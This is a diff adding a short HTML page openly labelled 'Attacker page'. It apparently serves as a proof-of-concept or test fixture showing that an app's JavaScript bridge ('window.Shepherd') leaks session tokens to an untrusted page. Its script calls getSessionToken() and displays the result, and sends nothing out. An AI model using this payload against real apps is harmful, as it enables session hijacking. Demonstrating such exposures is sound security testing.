@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Attacker page</title>
+<style>
+body{font-family:monospace;margin:0;padding:16px;background:#1c1014;color:#ffb3b3}
+h1{font-size:18px;margin:0 0 8px;color:#ff6b6b}
+.card{background:#2a171c;border:1px solid #7a2e3a;border-radius:10px;padding:12px;margin-top:12px;word-break:break-all}
+</style></head><body>
+<h1>Attacker-controlled page</h1>
+<div class="card">Served from host: <b id="host"></b></div>
+<div class="card">Session token read from the app: <b id="loot">(bridge not available)</b></div>
+<script>
+document.getElementById('host').textContent = window.location.host;
+if (window.Shepherd) {
+  document.getElementById('loot').textContent = window.Shepherd.getSessionToken();
+}
+</script>
+</body></html>
